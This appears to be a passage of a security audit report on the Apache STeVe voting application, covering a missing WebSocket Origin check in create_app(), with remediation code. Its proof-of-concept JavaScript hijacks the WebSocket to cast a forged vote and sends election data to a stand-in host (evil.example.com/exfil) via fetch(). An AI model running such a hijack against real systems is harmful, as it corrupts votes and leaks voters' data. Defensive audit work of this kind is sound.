## 4. Findings

### Medium Severity

#### ASVS-442-MED-001: No WebSocket Origin Header Validation Infrastructure

**Severity:** MEDIUM

**Location:**
- **File:** `v3/server/main.py`
- **Function:** `create_app()`
- **Lines:** 36–51

**Related Functions Checked:**
- `create_app()` — Application initialization (no middleware registered)
- `run_standalone()` — Server startup (no security hooks added)
- Imported modules: `pages`, `api` (not provided for review)

**Description:**

The application lacks any infrastructure for validating the `Origin` header during WebSocket handshakes. The `create_app()` function, which serves as the sole application configuration entry point, establishes zero WebSocket security controls:

1. **No allowed-origins list** is defined in application configuration
2. **No `before_websocket` or `before_request` middleware** is registered to inspect the `Origin` header
3. The underlying framework (`asfquart`, built on Quart) **does not validate WebSocket Origin headers by default**
4. All WebSocket endpoints defined in `pages` and `api` modules inherit this unprotected configuration

This represents a **Type A gap** — no control exists at any layer.

**Vulnerable Code:**

```python
def create_app():
    "Create the asfquart app and its endpoints."

    import asfquart.generics

    asfquart.generics.OAUTH_URL_INIT = (
        'https://oauth.apache.org/auth?state=%s&redirect_uri=%s'
    )
    asfquart.generics.OAUTH_URL_CALLBACK = 'https://oauth.apache.org/token?code=%s'

    app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None)

    # Now that we have an APP, import modules that will add page
    # and API endpoints into the APP.
    import pages  # noqa: F401
    import api  # noqa: F401

    return app  # also available as asfquart.APP now
```

**Data Flow:**

```
Malicious Origin (attacker-controlled browser) 
  → WebSocket upgrade request with Origin: https://evil.example.com
  → asfquart/Quart framework accepts handshake (no middleware check)
  → WebSocket connection established
  → Attacker performs cross-origin WebSocket hijacking
```

**Proof of Concept:**

```javascript
// From attacker-controlled page at https://evil.example.com
const ws = new WebSocket("wss://target-steve-instance.apache.org/ws/election");
// Connection succeeds — no Origin check blocks it
ws.onopen = () => {
    ws.send(JSON.stringify({action: "vote", candidate: "attacker-choice"}));
};
ws.onmessage = (event) => {
    // Exfiltrate election data cross-origin
    fetch("https://evil.example.com/exfil", {method: "POST", body: event.data});
};
```

**Impact:**

If WebSocket endpoints exist in `pages` or `api` modules, an attacker can perform **Cross-Site WebSocket Hijacking (CSWSH)**. An authenticated user visiting a malicious page would have their browser establish a WebSocket connection to the voting application using their existing session cookies, allowing the attacker to:

- Submit or modify votes on behalf of the victim
- Read election state or results in real-time
- Bypass CSRF protections (WebSocket connections are not subject to SameSite cookie restrictions in all browsers)
- Compromise the integrity and confidentiality of the voting process

**Remediation:**

Add a `before_websocket` hook in `create_app()` that validates the `Origin` header against an explicit allow-list:

```python
def create_app():
    app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None)

    # Define allowed WebSocket origins from configuration
    ALLOWED_WS_ORIGINS = set(app.cfg.server.get('allowed_origins', [
        'https://steve.apache.org',
    ]))

    @app.before_websocket
    async def validate_websocket_origin():
        from quart import websocket, abort
        origin = websocket.headers.get('Origin', '')
        if origin not in ALLOWED_WS_ORIGINS:
            abort(403)

    import pages
    import api
    return app
```

**Additional Configuration:**

Add to application configuration file:

```yaml
server:
  allowed_origins:
    - https://steve.apache.org
    - https://voting.apache.org
```

## 6. Architecture Observations

### Framework Abstraction Limits Visibility

The `asfquart` framework wraps Quart, and security defaults depend entirely on framework internals not visible in this audit. The absence of explicit WebSocket security configuration means the application relies on framework defaults, which for Quart **do not include Origin validation**. This creates a security-by-obscurity risk where developers may assume protection exists when it does not.

### Decoupled Endpoint Registration

The `pages` and `api` modules are imported but not provided for review. A complete audit requires inspecting these modules for:
- WebSocket endpoint definitions (`@app.websocket(...)`)
- Any handler-level Origin checks
- Session validation in WebSocket handlers
- Message validation and sanitization

### No Security Middleware Layer

The `create_app()` function registers no `before_request`, `before_websocket`, or `after_request` hooks. This means there is no centralized security enforcement layer for any request type. Security concerns are likely handled ad-hoc in individual handlers, increasing the risk of inconsistent protection.

### Configuration-Driven Security Absent

No security-related configuration is loaded or referenced in the application bootstrap. Security parameters (allowed origins, rate limits, etc.) appear to be either hardcoded or non-existent, making security policy updates require code changes rather than configuration updates.
